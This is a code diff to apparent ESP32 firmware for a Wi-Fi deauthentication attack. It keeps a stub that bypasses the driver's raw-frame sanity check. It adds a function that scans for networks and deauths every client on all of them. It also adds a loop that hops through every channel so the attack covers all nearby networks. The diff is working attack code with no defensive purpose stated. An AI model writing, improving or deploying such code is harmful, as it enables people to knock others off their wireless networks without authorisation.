@@ -7,6 +7,7 @@
 deauth_frame_t deauth_frame;
 int deauth_type = DEAUTH_TYPE_SINGLE;
 int eliminated_stations;
+int curr_channel = 1;
 
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
   return 0;
@@ -65,7 +66,24 @@ void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
   esp_wifi_set_promiscuous_rx_cb(&sniffer);
 }
 
+void enable_deauth() {
+  WiFi.scanNetworks();
+  start_deauth(0, DEAUTH_TYPE_ALL, 4);
+}
+
 void stop_deauth() {
   DEBUG_PRINTLN("Stopping Deauth-Attack..");
   esp_wifi_set_promiscuous(false);
+}
+
+void deauth_loop() {
+  if (deauth_type == DEAUTH_TYPE_ALL) {
+    if (curr_channel > CHANNEL_MAX) curr_channel = 1;
+    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
+    curr_channel++;
+    delay(10);
+  } else {
+    Serial.println("Deauth mode not activated");
+    delay(1000);
+  }
 }
